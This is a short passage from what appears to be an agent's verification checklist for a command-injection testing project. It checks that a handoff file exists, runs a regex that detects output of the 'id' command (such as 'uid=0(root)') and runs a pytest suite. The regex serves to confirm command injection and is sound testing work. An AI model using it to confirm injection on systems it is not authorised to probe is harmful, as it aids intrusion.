   ```bash
   test -f /home/varun/argus/.agents/spec_miner_cmdi/handoff.md
   ```
2. Verify regex validation script execution:
   ```bash
   python3 -c "import re; r=re.compile(r'uid=\d+\([a-zA-Z0-9_\-.]+\)\s+gid=\d+'); assert r.search('uid=0(root) gid=0(root)')"
   ```
3. Run existing test suite to ensure system baseline is intact:
   ```bash
   python -m pytest tests/ --ignore=tests/workspace -x -q
   ```
